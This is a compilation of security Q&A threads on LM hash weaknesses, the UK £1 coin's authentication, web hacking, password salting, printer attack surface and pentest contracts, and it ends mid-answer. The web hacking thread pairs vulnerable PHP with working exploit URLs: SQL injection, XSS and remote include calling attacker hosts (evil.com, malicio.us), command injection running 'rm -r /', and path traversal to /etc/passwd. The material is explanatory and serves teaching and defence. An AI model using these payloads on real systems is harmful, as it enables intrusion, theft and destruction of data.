Others have explained why good cryptographic hash functions are difficult to reverse - but according to this Wikipedia article, LanMan is poorly designed and can be reversed relatively easily:


  Although it is based on DES, a well-studied block cipher, the LM hash
  is not a true one-way function as the password can be determined from
  the hash because of several weaknesses in its implementation... By
  mounting a brute force attack on each half separately, modern desktop
  machines can crack alphanumeric LM hashes in a few hours... In 2003, Ophcrack, an implementation of the rainbow table technique, was published. It specifically targets the weaknesses of LM encryption, and includes pre-computed data sufficient to crack virtually all alphanumeric LM hashes in a few seconds.
AnswerKenntnis:
I think there are many reasons, but one is obvious: a digest produced by a hash function can never contain infinite information, since the digest has finite bits. But the hash function can be used to hash inputs of infinite information. The input can actually be anything.

The hardship to find out a collision is not the answer. The real hardship is proving your original data is actually the only possible input that matches a certain digest. I think you may never calculate one input and claim it is the only answer to the digest.
AnswerKenntnis:
Reversing a mod hash is simple. Ex:- (bytes summatory) mod (d) = hash. So if you want to generate all the inputs for a hash is int bytes summatory = int n*int d + int hash 
what about that?

Ff is the XOR between two blocks its simple, say the bit is one, or block 1 = 0 and block 2 = 1, or block 1 = 1 and block 2 = 0. Say the bit is 0 or (b1=0 ^ b2=0) or (b1=1 ^ b2=1). These are correct answers for the same output.
QuestionKenntnis:
How does the authentication in the new UK £1 coin work?
qn_description:
The UK is getting a new ┬ú1 coin.  Its designers, the Royal Mint, claim that unlike current coins, it includes built in technology for high speed authentication and verification everywhere from ATMs to vending machines and point-of-sale.

How does this work?  Something like RFID?  Does this mean the coins (and therefore their users) can be tracked?
AnswersKenntnis
AnswerKenntnis:
They are using a system called ISIS which also has some more details available here.  It appears to be a form of micro-tagging embedded within the currency itself (based on the comment the same technology has been used in fuels and perfumes).  

Basically, a specially manufactured particle is constructed and then mixed as an additive with the coin.  This additive can later be detected automatically.  Since the composition of the additive is unknown, it can't be reproduced easily but yet machines can read the signature of it.

The tagging technology can be used to tag specific coins (this is done for some high end unique items that are tagged), but it would generally be very expensive to do so.  It is far more likely that a standard formulation is used for all coins of a given value.  It would also still very likely require that the coin be directly handled to read as it is not a radio based technology.
AnswerKenntnis:
The Royal Mint indicated that the technology is patented, and having relatively few patents under its name it seems likely that they are tagging their coinage with embedded luminescent particles.

Abstract:


  Formation of an authentication element by deposition of a metal layer with embedded particles on a metal substrate, wherein the embedded particles are configured to convert energy from one wavelength to another. The embedded particles may be upconverters, downconverters, or phosphorescent phosphors, which can be detected and measured with analytical equipment when deposited in the metal layer. A metal substrate may include coinage.


Essentially they are embedding inorganic fluorescent compounds into the metal plating on the coin.  When a certain spectrum of light is shone on the coin, these particles absorb that energy and emit a different spectrum. So, depending on the particle they embed, the detector may be as simple as a UV LED and a light sensor at a specific wavelength.

By integrating different ratios of different particles they can differentiate between different coins, for instance.

Further, the patent explains that the plating process generally includes many layers of plating.  They can add different mixes at each layer, and thus tell how well-used a coin is, by how many of the upper layers are removed.  Aging the coin can be useful to determine when to take it out of circulation before these particles are entirely removed.

This technology can also be used in automotive parts, and technology equipment to defeat counterfeiting.  For instance if you replace your iPhone screen with a counterfeit part, unless the counterfeiter goes to the trouble of matching the exact luminescent profile, Apple may be able to detect that you broke your phone's warranty, should Apple choose to use such technology to protect themselves from counterfeit products.

The technology doesn't include any sort of serial number or tracking component, so tracking coins through the system is unlikely, but perhaps other techniques they apply to the coins could be used for that purpose.
AnswerKenntnis:
Well, obviously we don't know - security by obscurity is a perfectly good idea so long as it is only one part of a security in depth approach. 

But my understanding is that it is chemical - ISIS is a plating system that uses a material that you can cheaply and accurately detect, so your vending machine can taste the coins and figure out if they are good or bad. 

I suspect a state security apparatus could use this technology to make a batch of "marked" coins and follow them, which would have some limited applications. However, in a world where everyone has a computer in their pocket there are better ways to follow people.
AnswerKenntnis:
The BBC has a two minute video of talking heads discussing the technology but it doesn't show how it works.

The iSIS technology is a 'special material' that can be added to the existing aRMour technology that electroplates a 25 micron coating on coin blanks.

The mint's PDF submission to the International Association of Currency Affairs explained that there will be low speed 'simple iSIS' detectors at point-of-sale (in shops) as well as 'advanced iSIS' high speed detectors in banks.

The patent Adam Davis linked too seems to be the key.  Instead of merely looking at the different ratios of materials as Davis suggests presumably particles' X Y positions could be detected and stored then indexed using a Scale Invariant Feature Transform.  In that way if the advanced iSIS had recorded a particular coin's signature, and the coin was being tracked, it could be found again the next time it is scanned.  Similar to serial number tracking on notes.
QuestionKenntnis:
How does hacking work?
qn_description:
I am specifically talking about web servers, running Unix. I have always been curious of how hackers get the entry point. I mean I don't see how a hacker can hack into the webpage when the only entry method they have into the server is a URL. I must be missing something, because I see no way how the hacker can get access to the server just by changing the URL.

By entry point I mean the point of access. The way a hacker gets into the server.

Could I get an example of how a hacker would make an entry point into a webserver? Any C language is acceptable. I have absolutely no experience in hacking

A simple example would be appreciated.
AnswersKenntnis
AnswerKenntnis:
Hacks that work just by changing the URL


One legit and one malicious example
Some examples require URL encoding to work (usually done automatically by browser)


SQL Injection

code: 

$username = $_POST['username'];
$pw = $_GET['password'];
mysql_query("SELECT * FROM userTable WHERE username = $username AND password = $pw");


exploit (logs in as administrator without knowing password):

example.com/?username=Administrator&password=legalPasswordThatShouldBePostInsteadOfGet
example.com/?username=Administrator&password=password' or 1=1--




Cross Site Scripting (XSS)

code: 

$nickname= $_GET['nickname'];
echo "<div>Your nickname is $nickname</div>\n";


exploit (registrers visiting user as a zombie in BeEF): 

example.com/?nickname=Karrax
example.com/?nickname=<script src="evil.com/beefmagic.js.php" />




Remote code execution

code (Tylerl's example):

<? include($_GET["module"].".php"); ?>


exploit (downloads and runs arbitrary code) :

example.com/?module=frontpage
example.com/?module=pastebin.com/mymaliciousscript




Command injection

code:

<?php
echo shell_exec('cat '.$_GET['filename']);
?>


exploit (tries to delete all files from root directory):

example.com/?filename=readme.txt
example.com/?filename=readme.txt;rm -r /




Code injection

code:

<?php
$myvar = "varname";
$x = $_GET['arg'];
eval("\$myvar = \$x;");
?>


exploit (injects phpinfo() command which prints very usefull attack info on screen):

example.com/?arg=1
example.com/?arg=1; phpinfo() 




LDAP injection

code:

<?php
$username = $_GET['username'];
$password = $_GET['password'];
ldap_query("(&(cn=$username)(password=$password)")
?>


exploit (logs in without knowing admin password):

example.com/?username=admin&password=adminadmin
example.com/?username=admin&password=*




Path traversal

code:

<?php
include("./" . $_GET['page']);
?>


exploit (fetches /etc/passwd):

example.com/?page=front.php
example.com/?page=../../../../../../../../etc/passwd




Redirect/Forward attack

code:

 <?php
 $redirectUrl = $_GET['url'];
 header("Location: $redirectUrl");
 ?>


exploit (Sends user from your page to evil page) :

example.com/?url=example.com/faq.php
example.com/?url=evil.com/sploitCode.php




Failure to Restrict URL Access

code:

N/A. Lacking .htaccess ACL or similar access control. Allows user to guess or by other 
means discover the location of content that should only be accessible while logged in.


exploit:

example.com/users/showUser.php
example.com/admins/editUser.php




Cross-Site Request Forgery

code:

N/A. Code lacks page to page secret to validate that request comes from current site.
Implement a secret that is transmitted and validated between pages. 


exploit:

Legal: example.com/app/transferFunds?amount=1500&destinationAccount=4673243243
On evil page: <img src="http://example.com/app/transferFunds?amount=1500
destinationAccount=evilAccount#" width="0" height="0" />




Buffer overflow (technically by accessing an URL, but implemented with metasploit

code:

N/A. Vulnerability in the webserver code itself. Standard buffer overflow


Exploit (Metasploit + meterpreter?):

http://www.exploit-db.com/exploits/16798/
AnswerKenntnis:
The (currently) most common way in is through holes in PHP applications. There are dozens of ways in which this could work, but here's a simple, easy one:

Imagine the unsuspecting site owner decides to take a shortcut in his code such that http://example.com/site.php?module=xyz actually first loads some template shell and then run "xyz.php" to fill in the content. So perhaps he writes something like this:

<h1>My Awesome CMS</h1>
<? include($_GET["module"].".php"); ?>
<p>See what I did there? Wow that was clever.</p>


The hacker then visits the site using the following URL:
http://example.com/site.php?module=http://malicio.us/evilprogram

Now, instead of loading his local script, PHP goes out and downloads http://malicio.us/evilprogram.php and executes it -- running whatever PHP code the attacker desires. Perhaps sending spam, perhaps installing a backdoor shell, perhaps searching the configuration files for passwords.

There are literally thousands of ways to hack a site, each as novel as the next. Almost universally, they involve a programmer who didn't think about all the possible inputs to their program and the unexpected effects they might have.
AnswerKenntnis:
There are 2 ways of looking at it, you could focus on the server itself, or focus on the web application that the server is running.

As a server, it can have open ports running services that you can connect to and gain access to the server. By using known exploits, you could gain root access. For example, some FTP servers for Unix have vulnerabilities that can be exploited by tools like Metasploit to gain a root shell.

As an application, there are far too many ways to exploit a poorly written or configured application. For instance, if you pass a SQL query as a GET, you could actually manipulate the URL itself to perform a SQL Injection attack and dump entire databases. For example (depending on the coding of the site):
http://www.mydomain.com/products/products.asp?productid=123 UNION SELECT username, password FROM USERS

Again, you touch on a massive subject and I hope these help you focus your next steps.
AnswerKenntnis:
The Short Answer

This might not be the right question.

A hacker...

...is a social engineer.

They are more interested in their interactions with people than their interactions with computers.  A hacker would far rather have you hand him your password, than have to brute force it.

...is seeking knowledge...

...and knows that knowledge is power.  A hacker is more interested in getting your credit card number than he is in actually using it.

...uses morality as an excuse...

...not a cause.  This is why many hackers will take advantage of morally-oriented political events to go public.  They know they can use morality to excuse their actions in the eyes of the public.

...doesn't get caught unless he wants to.

Most of the time.  Wannabe hackers who just jump right in without any regard for stealth or anonymity are known as "script kiddies" or "skiddies" within the hacking community.  There are far more skiddies than hackers, most likely, and they will likely be your biggest annoyance.

...doesn't need any special tools or backdoors.

The frontend that you've provided is likely sufficient.

The Long Answer

You can secure yourself against the exploits in Metasploit all you want.  A hacker will just walk right on in through the front door--if not virtually, literally.

The Answer You Want

Seeing as how people don't like the answer that I gave, as adequate as it is, I'll give you something a bit more along the lines of what you want.

Hackers like to stay anonymous.  The first step in any attack is stringing together a line of proxies of some sort, be they SOCKS proxies, zombies, or just simple bots forming a botnet.  There are a few ways of going about this, but let's get some dead proxies for the sake of discussion.  Head on over to pastebin.com and do a search for 8080.  This is a common port for web proxies.  Scroll down in the results until you find a list of IP addresses and click to view the result.  You should have a long list of web proxies.  I can guarantee that most, if not all, will be dead.  Sorry, this is not a hacking tutorial.

The next step is to gather seemingly trivial information about your target.  Using his proxies, a hacker would run portscans, then probe any services that he finds.  Got a website?  Let's explore it.  Got a MySQL server?  Let's see what version it is.  Running SSH?  Let's see if it accepts text passwords, or is limited to certificates.

Then the hacker sits down, looks at what he's gathered, and decides what the weakest point of the system is.  Depending on the size of the system, he might go back and probe a bit more, if there is more to probe and he feels he hasn't acquired a good enough weakness.  A weakness doesn't have to be a true security "hole": it just has to be the weakest link.  Perhaps you have an FTP server that doesn't protect against hammering (repeated login attempts).  Maybe you have a web server with a bunch of forms or potentially exploitable URLs.  Those are worth investigating further.

If necessary, the attacker might write a script or program to carry out the final attack, though this isn't always the case.  Most weaknesses can be exploited with existing tools, so this usually is unnecessary for the modern hacker.  However, occasionally hackers discover new security holes in software, in which case they sometimes need to write special tools to exploit said software.

A good example of a blatantly obvious attack program is one that is used to cause trouble on servers for a game called Terraria.  This wasn't its original purpose, but because it does expose various exploits in the server software, it does tend to be used for that by others.  I wrote it in C#.  The source code is available on GitHub.  The exploits use bytecode manipulation to modify the existing client to send malicious data.  The server does not expect this data, and reacts in ways in which it was not designed to function.  Discovering exploits like this can be as simple as reverse engineering the target software--I say simple because this has become an increasingly easy task with modern reflective languages, such as C# and Java.  Programs such as .NET Reflector (paid) and dotPeek (free, for now) make this possible with the click of a button.  A sufficiently trained C# programmer can then observe the code, determine its functionality, and write a program to alter this functionality.
AnswerKenntnis:
A friend of mine had a contract to work on a site. While he did he notice hackers got into the website and did stuff he didnt like. After looking at some log files he notice the 'hackers' found the site by googling a mysql error.

When you're able to inject sql you can do whatever you want such as creating yourself an account. If you can upload files (especially php) you have a possibility of being able to execute it. If you can execute it you can do more damage like read/write files on the server filesystem even if you dont have an account on the linux/windows server.

Another technique is breaking into the database, looking at the passwords (especially if they aren't hashed) than trying to establish a ssh or ftp connection to the same ip address of the site and trying the user/password combinations.

Also you dont need to break into the server to get hacked. Someone i met told me a story how outdated software was installed on his server. The attackers used it to upload and execute their own php file which injected one line of code (to add an iframe) into every index.php and index.html file. Essentially no one was able to visit the site. It either redirected or gave lots of popups.
AnswerKenntnis:
How many times have we read about logins with either no password or "Joes"?  Doesn't require knowledge of Metasploit or anything really exotic to get in the front door.  A bit like a running car sitting in a driveway on a cold morning "Please steal me".
AnswerKenntnis:
Just a few more examples for you to consider.

Following on from tylerl's example:

<?php
   if ( isset( $_GET[ 'id' ] ) ) include( $_GET[ 'id' ] . ".php" );
?>


Attack vector: 

http://victimsite.com/?id=php://filter/read=convert.base64-encode/resource=includes/configure


This is a local file include base64 attack due to lack of any secure coding, an attacker is able to read almost any file on the site or server that ends in [.php], in this case reading the file contents of the configure.php file, PHP returns a base64_encode of the entire file content which is easily decoded back to readable text.

However the malformed URL does not have to seek input security validation holes.

In many web commerce sites, the $PHP_SELF code misreports the filename where yoursite.com/admin/administrators.php, $PHP_SELF reported the filename as administrators.php, however if login.php was appended like admin/administrators.php/login.php, then $PHP_SELF misreport login.php as the filename instead of administrators.php.

So for example if the admin session validation question is asked in this awe inspiring example: 

*if ( not a valid admin session ) and ( $PHP_SELF is not = to login.php ) then redirect to login.php*

The page is never going to redirect to the login.php because $PHP_SELF is misreporting the true filename, thus the attacker has access to the administrators.php file without the need for correct credentials.
QuestionKenntnis:
Why are salted hashes more secure?
qn_description:
I know there are many discussions on salted hashes, and I understand that the purpose is to make it impossible to build a rainbow table of all possible hashes (generally up to 7 characters).

My understanding is that the random salted values are simply concatenated to the password hash. Why can a rainbow table not be used against the password hash and ignore the first X bits that are known to be the random salt hash?

Update

Thanks for the replies. I am guessing for this to work, the directory (LDAP, etc) has to store a salt specific to each user, or it seems like the salt would be "lost" and authentication could never occur.
AnswersKenntnis
AnswerKenntnis:
It typically works like this:

Say your password is "baseball". I could simply store it raw, but anyone who gets my database gets the password. So instead I do an SHA1 hash on it, and get this: 


  a2c901c8c6dea98958c219f6f2d038c44dc5d362


Theoretically it's impossible to reverse a SHA1 hash. But go do a google search on that exact string, and you will have no trouble recovering the original password. 

Plus, if two users in the database have the same password, then they'll have the same SHA1 hash. And if one of them has a password hint that says try "baseball" -- well now I know what both users' passwords are.

So before we hash it, we prepend a unique string. Not a secret, just something unique. How about WquZ012C. So now we're hashing the string WquZ012Cbaseball. That hashes to this:


  c5e635ec235a51e89f6ed7d4857afe58663d54f5


Googling that string turns up nothing (except perhaps this page), so now we're on to something. And if person2 also uses "baseball" as his password, we use a different salt and get a different hash. 

Of course, in order to test out your password, you have to know what the salt is. So we have to store that somewhere. Most implementations just tack it right on there with the hash, usually with some delimiter. Try this if you have openssl installed:

[tylerl ~]$ openssl passwd -1
Password: baseball
Verifying - Password: baseball
$1$oaagVya9$NMvf1IyubxEYvrZTRSLgk0


This gives us a hash using the standard crypt library. So our hash is $1$oaagVya9$NMvf1IyubxEYvrZTRSLgk0: it's actually 3 sections separated by $. I'll replace the delimiter with a space to make it more visually clear:

$1$oaagVya9$NMvf1IyubxEYvrZTRSLgk0
 1 oaagVya9 NMvf1IyubxEYvrZTRSLgk0



1 means "algorithm number 1" which is a little complicated, but uses MD5. There are plenty others which are much better, but this is our example.
oaagVya9 is our salt. Plunked down right there in with our hash.
NMvf1IyubxEYvrZTRSLgk0 is the actual MD5 sum, base64-encoded.


If I run the process again, I get a completely different hash with a different salt. In this example, there are about 1014 ways to store this one password. All of these are for the password "baseball":

$1$9XsNo9.P$kTPuyvrHqsJJuCci3zLwL.
$1$nLEOCtx6$uSnz6PF8q3YuUhB3rLTC3/
$1$/jZJXTF3$OqDuk8T/cEIGpeKWfsamf.
$1$2lC.Cb/U$KR0jkhpeb1sz.UIqvfYOR.


But, if I deliberately specify the salt I want to check, I'll get back my expected result:

[tylerl ~]$ openssl passwd -1 -salt oaagVya9
Password: baseball
Verifying - Password: baseball
$1$oaagVya9$NMvf1IyubxEYvrZTRSLgk0


And that's the test I run to check to see if the password is correct. Find the stored hash for the user, find the saved salt, re-run that same hash using saved salt, check to see if the result matches the original hash.

Implementing This Yourself

To be clear, this post is not an implementation guide. Don't simply salt your MD5 and call it good. That's not enough in today's risk climate. You'll instead want to run an iterative process which runs the hash function thousands of times. This has been explained elsewhere many times over, so I won't go over the "why" here. 

There are several well-established and trusted options for doing this:


crypt: The function I used above is an older variation on the unix crypt password hashing mechanism built-in to all Unix/Linux operating systems. The original (DES-based) version is horribly insecure; don't even consider it. The one I showed (MD5-based) is better, but still shouldn't be used today. Later variations, including the SHA-256 and SHA-512 variations should be reasonable. All recent variants implement multiple rounds of hashes.
bcrypt: The blowfish version of the crypt functional call mentioned above. Capitalizes on the fact that blowfish has a very expensive key setup process, and takes a "cost" parameter which increases the key setup time accordingly.
PBKDF2: ("Password-based Key Derivation Function version 2") Created to produce strong cryptographic keys from simple passwords, this is the only function listed here that actually has an RFC. Runs a configurable number of rounds, with each round it hashes the password plus the previous round's result. The first round uses a salt. It's worth noting that its original intended purpose is creating strong keys, not storing passwords, but the overlap in goals makes this a well-trusted solution here as well. If you had no libraries available and were forced to implement something from scratch, this is the easiest and best-documented option. Though, obviously, using a well-vetted library is always best.
scrypt: A recently-introduced system designed specifically to be difficult to implement on dedicated hardware. In addition to requiring multiple rounds of a hashing function, scrypt also has a very large working memory state, so as to increase the RAM requirement for implementations. While very new and mostly unproven, it looks at least as secure as the others, and possibly the most secure of them all.
AnswerKenntnis:
It is not added after the hash.  It is added before the hash, so the hash is completely different for every salt.

It isn't 

hash abcd = defg
store 123defg (for user with 123 salt) and 456defg (for user with 456 salt)  


It is

hash 123abcd = ghij 
hash 456abcd = klmn
AnswerKenntnis:
Technically you can still use a rainbow table to attack salted hashes. But only technically. A salted hash defeats rainbow table attacks, not by adding crypto magic, but just by exponentially increasing the size of the rainbow table required to successfully find a collision.

And yes, you'll need to store the salt :)
AnswerKenntnis:
For password hashes, you need to use something like PBKDF2/RFC2898/PKCS5v2, Bcrypt, or Scrypt, all of which allow you to select an amount of iterations ("work factor"), rather than just one.  PBKDF2, for instance, uses HMAC keyed hashing with a well known hash algorithm (typically SHA-512, SHA-256, or SHA-1) internally for a number of iterations, preferably tens to hundreds of thousands as high as you can keep it without users complaining, essentially.

The reason for the large number of iterations is to slow down an attacker, which in turn reduces the keyspace they can go through in a given time period, so they can't attack the better passwords effectively.  "password" and "P@$$w0rd" are going to be cracked regardless in an offline attack, obviously.

You are correct, each row (user) needs their own uniquely generated, cryptographically random long salt.  That salt is stored in plaintext form.  

With PBKDF2, Bcrypt, or Scrypt, I would also recommend storing the number of iterations (work factor) in the database in plaintext as well, so it's easy to change (personally, I use a somewhat randomized number of iterations - if it's always different, then there's less fear about "oh no, a tiny change might mess everything up - NEVER CHANGE THIS AGAIN" from management or other developers)

Note that when using PBKDF2 for password hashing, never ask for a larger output than the native hash output - for SHA-1, that's 20 bytes, and for SHA-512, that's 64 bytes.

To give actual examples of PBKDF2 with two different salts:

(PBKDF2 HMAC password salt iterations outputbytes results)


PBKDF2 HMAC-SHA-512 MyPass vA8u3v4qzCdb 131072 64

2e3259bece6992f012966cbf5803103fdea7957ac20f3ec305d62994a3f4f088f26cc3889053fb59a4e3c282f55e9179695609ee1147cffae1455880993ef874

PBKDF2 HMAC-SHA-512 MyPass l6eZQVf7J65S 131072 64

1018ad648096f7814bc2786972eb4091f6c36761a8262183c24b0f4d34abb48073ed2541ee273220915638b46ec14dfb2b23ad64c4aa12f97158340bdc12fc57
AnswerKenntnis:
It's more secure because when multiple people have same password they will have different hash.

Simple implementation using Python: 

import hashlib

passwordA = '123456'
passwordB = '123456'

hashlib.md5(passwordA).hexdigest()
'e10adc3949ba59abbe56e057f20f883e'

hashlib.md5(passwordB).hexdigest()
'e10adc3949ba59abbe56e057f20f883e'


And now let's add salt:

saltA = 'qwerty'
salbB = 'asdfgh'

passA = passwordA + saltA
passB = passwordB + saltB

hashlib.md5(passA).hexdigest()
'086e1b7e1c12ba37cd473670b3a15214'

hashlib.md5(passB).hexdigest()
'dc14768ac9876b3795cbf52c846e6847'


This is very simplified version. You can add salt wherever you prefer. In the beginning/middle/end of password.

Salt is very useful, especially when you have a lot of users so each of them will have different hashes. Now imagine the probability to have same passwords for million accounts, such as Facebook or Google or Twitter account.
AnswerKenntnis:
First, if two users use the rather weak password "baseball", then cracking one password doesn't help at all cracking the second password because of salting. Without salting, you've cracked two passwords for the price of one. 

Second, rainbow tables contain pre-calculated hashes. So a cracker could lookup the hash of "baseball" in a rainbow table with a gazillion entries. Much faster than calculating the gazillion hashes in the rainbow table. And that's prevented by salting. 

And now an important one: Some people have good passwords, some have bad passwords. If you have a million users, and three use the identical password, you just know that password is weak. Without salting, you have three identical hashes. So if someone steals your database of hashes, they can immediately see which users have weak passwords and concentrate on cracking those. Much easier to crack "baseball" than 1keOj29fa0romn. Without salting, the weak passwords stand out. With salting, the cracker has no idea which passwords are weak and which ones are hard to crack.
AnswerKenntnis:
In addition to what tylerl said, it's important to stress that in modern crypto, salts are not used to protect against rainbow tables. No-one really uses rainbow tables. The real danger is parallelisation:


If you have no salt, or only a static salt, and I steal your DB of a million hashes, I can throw all my cores at bruteforcing it, and each core will be attacking a million hashes simultaneously, because any time I hit any of the strings used as passwords, I will see a hash match. So I need to exhaust the search space once to crack a million passwords. That is a completely realistic scale of password leak, and an attractive enough target to throw a couple dozen GPUs at or even a custom FPGA. Even if I only exhaust the bottom 30% of the search space, I will still walk away with 500k real-world passwords or so. Those passwords will be then used to build up my dictionary, so the next time someone leaks a hash DB, I will crack 90% of them in hours.
If instead each and every password is hashed with its own, unique salt, then I will need to attack every single one of them individually, because even identical passwords will have completely different hashes stored. That means I might perhaps use my expensive, power-hungry GPU/FPGA farm to attack the couple high-value targets (say, if Obama was your user, then getting his password would still warrant the expense), but I won't get several hundred thousand passwords for free from that. If I wanted to get the whole million passwords, I would have to do a full brute-force search a million times.


And that's why any salt, static or not, will protect you against prepared rainbow tables as long as it's not widely-used, but only unique per-hash salts will protect you against the real danger of using lots of parallel computing power to crack everything at once.
QuestionKenntnis:
Attacking an office printer?
qn_description:
I did an nmap scan on an advanced office printer that has a domain name and is accessible from outside the corporate network. Surprisingly I found many open ports like http:80, https:443, and svrloc:427 and some others. The OS fingerprint says somewhere: "...x86_64-unknown-linux-gnu...", which may indicate that this is some sort of an embedded Linux running some server software for the printer's functionality. 

How can I know whether this printer is increasing the attack surface on the network? For example, can it be exploited through a remote privilege escalation vul. and then launch a tunneling attack on other hosts in the network?
AnswersKenntnis
AnswerKenntnis:
You can have some serious fun playing with printers, photocopiers and other such devices - even UPSes. Security is usually an afterthought at best, if not totally absent.

Stuff I've seen:


Default credentials used everywhere, and web-based config panels storing passwords in plaintext, often within a generated config file. I've never seen anything better than plain MD5 on passwords, and in one case I saw CRC32.
Document names and usernames leaked via SNMP, usually via open read access to the device and over SNMPv1/2 where no transport security is used.
Default or hilariously weak SNMP private namespace names (usually "private", "snmp" or the manufacturer name), allowing you to reconfigure TCP/IP setttings, inject entries into the routing table, etc. remotely, and there are often ways to alter settings that can't be set in the control panel. It's pretty trivial to soft-brick the device.
UPnP enabled on the device in default setup, allowing for more remote configuration fun. Often you can print test pages, hard-reset the device, reset web-panel credentials, etc. Again it's usually possible to modify TCP/IP settings and other networking properties.
Very outdated 2.2.x and 2.4.x kernels, often with lots of nice root privilege escalation holes.
Badly written firmware upgrade scripts on the system, allowing you to flash arbitrary firmware to internal microcontrollers. You could use this to brick the device, or install a rootkit if you're willing to spend a lot of time developing it.
Custom or old SMB daemons, often vulnerable to RCE. Easy to pwn remotely.
Services running as root, user groups set up incorrectly, file permissions improperly set.
Printing jobs ran asynchronously by executing shell scripts, making it easy to escalate your privileges up to that of the daemon (often root).
Poorly written FTP servers built into the device. I'd bet good money that a fuzzer could crash most of those FTP daemons.
All of the usual webapp fails, but especially file upload vulnerabilities.


Here's where things get extra fun. Once you've pwned the printer, you can usually get hold of usernames and other juicy information from SMB handshakes. You'll also often find that the password to the printer's web control panel is re-used for other network credentials.

At the end of the day, though, the printer is an internal machine on the network. This means that you can use it to tunnel attacks to other machines on the network. On several occasions I've managed to get gcc and nmap onto a photocopier, which I then used as a base of operations.

What's the solution? First, you need to recognise that printers and photocopiers are usually fully-fledged computers, often running embedded Linux on an ARM processor. Second, you need to lock them down:


Update the firmware of the device to the latest version.
Firewall the printer off from the internet. This should be obvious, but it's often missed. TCP/IP-based printers / photocopiers usually bind to 0.0.0.0, so they can quite easily sneak onto the WAN.
If you can make the printer listen only to traffic from the LAN, do so.
Change the default credentials on the web control panel. Again, obvious, but still not done very often.
Find any services running on the device and attempt to break into them yourself. Once you're in, change passwords and turn off what's unnecessary.
Get yourself an SNMP discovery tool and dig around what's available for your printer. SNMP has a bit of a learning curve, but it's worth taking a look.
If you do internal network monitoring, set up a rule to watch for anything unusual coming out of the printer. This cuts false positives right down and gives you a good indication of when something dodgy is happening.


All in all, if it's a device plugged into your network it is probably pwnable, and should be part of your risk management.
AnswerKenntnis:
The major issue here is that your printer is accessible from outside your network. I've never seen a situation where printers need to be accessible from outside a network, and I mean ever! I suggest you get that fixed, and urgently!

There's more to printers than most people realize, but the risks can be managed by keeping them updated, turning off options that are insecure like http, and changing the admin passwords.
AnswerKenntnis:
Often printers maintain logs of printed documents, sometimes containing copies of the documents themselves being able to be downloaded remotely. Even if the documents themselves aren't sensitive metadata can sometimes leak information like the file server name, the computer it was sent from, username...
AnswerKenntnis:
Generally printers are the unseen and unmitigated risk in a lot of networks.  We tend to not think of them as computers, but the fact is almost any modern network printer has a fairly elaborate print server in it, often running some form of embedded linux, and far to often with very little thought given to security.  Since they have a full blown micro-controller in them, it is theoretically possible that just about any attack that could be done with a computer or open network jack on your network could also be done from the printer.

In approaching a printer directly connected to the web, I would first ask why it needs to live there instead of going through some other type of print service to request documents be queued to it.  If there is a compelling reason for it to live on the outside of your network, is there a reason it needs to be allowed inside?  If it's available to the internet, internal users could connect to it via the internet just as someone outside the network could.  This could provide some isolation as well.
AnswerKenntnis:
It is an attack point, so yes, it increases the attack surface of your network. That point could be used to get to another internal web page. Maybe your printer has network credentials that you could steal or replay, etc.

A simple attack on a printer is to change its configuration to save documents both printed or scanned/faxed locally and retreive them later. The printer in itself is irrelevant, it is the data it gives you access to that matters.

Chances are the HTTP(S) ports will give you a web page with a VNC window implemented as a Java applet (our Lexmark printer does that). Even if the physical printer requires us to present our access badge, a VNC connexion will hijack the "session" of someone who is locally at the printer, credentials and all.

What you can do really depends on the printer type and how persistent is the attack.
AnswerKenntnis:
This is a unique physical implication of a printer being compromised:

http://it.slashdot.org/story/11/11/29/1752231/printers-could-be-the-next-attack-vector

I've used Nessus and found that even printers with the most basic features that you'll find on home networks have vulns like default credentials and open ports galore.
AnswerKenntnis:
I'd like to mention a different aspect of this - many copier/device manufacturers will ask that they can access the device remotely as part of their support contact. That surely leads to some companies allowing access directly to the device.

A better solution is to allow external support staff to only connect to a bastion host, and connect to the copier/device from there.
AnswerKenntnis:
Seems odd and you might have a case for it, but it's rare to have a business need to keep a printer accessible outside the firewall AND the VPN. Now I'm generalizing but with an "advance" printer:


Bear in mind that a "Secure printer" doesn't increase sales. There is likely very little engineering effort in securing the printer to begin with. 
Due to above, the software and kernel are likely to be older. i.e. their security vulnerabilities are already known and published 
Don't think of it as a 'printer' it's essentially a server running Linux. Linux you can't patch or harden easily
It is essentially a great launching point for more sophisticated attacks since this situation most likely breaks many security assumptions made in architecting the security policy (eg: FTP password ok since no malicious network sniffers). Faking DNS => MITM => tunneling SSL traffic outside.
If it happens to be a scanner many devices cache scanned documents in the temp folder (similarly with in-device printer queues)
QuestionKenntnis:
Is it acceptable that a skilled professional pentester deletes or modifies sensitive data in production unintentionally during a pentest?
qn_description:
Today I experienced a situation where a person responsible for the security of a company required a pentesting company to withdraw a clause in the contract that says that: 

"during the pentest there exist the possibility to delete or modify sensitive data in the production environment unintentionally due to the execution of some tools, exploits, techniques, etc."

The client says that he is not going to accept that clause and that he believes that no company would accept that clause. He thinks that during a pentest information could be accessed but never deleted or modified.

We know that the execution of some tools like web crawlers or spiders can delete data if the web application is very badly programmed, so the possibility always exists if those types of tools are going to be used.

I know that these are the conditions of the client, and should be accepted, but:

Can a skilled and professional pentester always assure that no data will be deleted or modified in production during a pentest?

Can a pentest really be done if the pentest team has the limitation that data cannot be created nor modified?

Should the pentesting company always include the disclaimer clause just in case?
AnswersKenntnis
AnswerKenntnis:
There's no way that a pentester can 100% assure that data will not be modified or deleted, in the same way as they can't assure that system availability won't be affected (I've knocked systems over with a port scan or a single ' character).  as you say a web crawler can delete data from a system if it's been set-up badly.

I'd say that what should be said is something like "every care will be taken to ensure that the testing does not negatively affect the systems under review and no deliberate attempts will be made to modify or delete production data or to negatively affect the availability of in-scope systems. However with all security testing there is a risk that systems will be affected and the customer should ensure that backups of all data and systems are in place prior to the commencement of the review"
AnswerKenntnis:
A pentester who claims that he will never alter production data is either a filthy liar, or thinks himself to be a lot more competent than he really is, or strongly intends to do nothing at all (that's the only surefire way of never breaking anything). In any case, you don't want to work with that guy.

A prospective customer who believes that skilled pentesters will never damage the tested systems, and who refuses to work with pentesters unless they promise exactly that, is a customer who 1. lives in the fairy unicorn dreamland, and 2. is almost guaranteed to ever do business only with filthy liars. He is in for some disillusion at some point, probably in a rather spectacular way.

It is a moral imperative and also basic self-protection for pentesters to include clauses about possible breakage in their contracts. The risk of collateral damage is real, even if the pentester is very good at what he does (because damage does not come from how good the pentester is but from how bad the tested system was designed and implemented). A pentester could be sued for not having warned the customer.

A customer who refuses a contract with such a clause has another name: "trouble". It is usually better to skip such customers altogether.
AnswerKenntnis:
Caveat: I am not a professional pentester. And I work in backup software.


  Can a skilled and professional pentester always assure that no data will be deleted or modified in production during a pentest?


